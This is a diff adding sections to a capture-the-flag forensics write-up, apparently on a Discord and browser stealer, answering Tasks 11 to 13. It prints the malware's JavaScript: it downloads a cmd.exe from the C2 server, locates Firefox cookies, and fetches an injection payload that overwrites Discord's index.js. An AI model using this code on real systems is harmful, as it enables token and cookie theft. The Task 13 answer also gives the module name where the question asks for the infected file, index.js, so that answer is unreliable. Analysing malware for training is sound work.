@@ -153,3 +153,90 @@ We can observe the earlier function's second part for that. If we look closely, 
 <img alt="Cover" src="images/vmtray.png" /> 
 </p>
 
+- Task 11 states that the malware has a special function which checks to see if C:\Windows\system32\cmd.exe exists. If it doesn't it will write a file from the C2 server to an unusual location on disk using the environment variable USERPROFILE. What is the location it will be written to?
+
+Let's take a look at the functions and see which one does this operation. In the bottom, there's a function called checkCmdInstallation, let's read it:
+```
+async function checkCmdInstallation() {
+    return await new Promise(async(resolve) => {
+        if(!existsSync('C:\\Windows\\system32\\cmd.exe')) {
+            const request = await fetch(options.api + 'cmd-file', {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'duvet_user': options?.user_id
+                }
+            });
+    
+            const response = await request.json();
+            writeFileSync(join(process.env.USERPROFILE, 'Documents','cmd.exe'), Buffer.from(response?.buffer), {
+                flag: 'w'
+            });
+            process.env.ComSpec = join(process.env.USERPROFILE, 'Documents', 'cmd.exe');
+            resolve();
+        } else {
+            process.env.ComSpec = 'C:\\Windows\\system32\\cmd.exe';
+            resolve();
+        };
+    });
+};
+```
+The answer is in the middle of the code. We can see the USERPROFILE, alongside the path and the .exe file. After formatting, the answer is `%USERPROFILE%\Documents\cmd.exe`.
+
+- Task 12 states that the malware appears to be targeting browsers as much as Discord. What command is run to locate Firefox cookies on the system?
+
+I mentioned earlier that some of the malware was targeting Firefox. Let's take a closer look.
+
+<p align="center">
+<img alt="Cover" src="images/firefo.png" /> 
+</p>
+
+Since this is the function that targets firefox, I decided to observe the code, which contained this line:
+```
+const cookiesFile = execSync('where /r . cookies.sqlite', { cwd: path })?.toString();
+```
+
+We can see that the command in `execSync` is used to locate the cookies. Therefore, the answer to task 12 is `where /r . cookies.sqlite`.
+
+- Task 13 states that to finally eradicate the malware, Forela needs you to find out what Discord module has been modified by the malware so they can clean it up. What is the Discord module infected by this malware, and what's the name of the infected file?
+
+Now there are 2 functions related to discord, one related to tokens and the other named injection. Injection is the one I assume that modifies the modules and I decided to check this function: 
+```
+async function discordInjection() {
+    const infectedDiscords = [];
+
+    [join(process.env.LOCALAPPDATA, 'Discord'), join(process.env.LOCALAPPDATA, 'DiscordCanary'), join(process.env.LOCALAPPDATA, 'DiscordPTB')]
+    ?.forEach(async(dir) => {
+        if(existsSync(dir)) {
+            if(!readdirSync(dir).filter((f => f?.startsWith('app-')))?.[0]) return;
+            const path = join(dir, readdirSync(dir).filter((f => f.startsWith('app-')))?.[0], 'modules', 'discord_desktop_core-1');
+            const discord_index = execSync('where /r . index.js', { cwd: path })?.toString()?.trim();
+            
+            if(discord_index) infectedDiscords?.push(
+                dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')
+            );
+
+            const request = await fetch(options.api + 'injections', {
+                method: 'GET',
+                headers: {
+                    duvet_user: options?.user_id,
+                    logout_discord: options?.logout_discord
+                }
+            });
+
+            const data = await request.json();
+
+            writeFileSync(discord_index, data?.discord, {
+                flag: 'w'
+            });
+
+            await kill(['discord', 'discordcanary', 'discorddevelopment', 'discordptb']);
+            exec(`${join(dir, 'Update.exe')} --processStart ${dir?.split(process.env.LOCALAPPDATA)?.[1]?.replace('\\', '')}.exe`, function(err) {
+                if(err) {};
+            });
+        };
+    });
+    return infectedDiscords;
+};
+```
+In the upper part of the code, the const path has the `modules` part, and the name of the file is `discord_desktop_core-1`, which is the answer to Task 13.
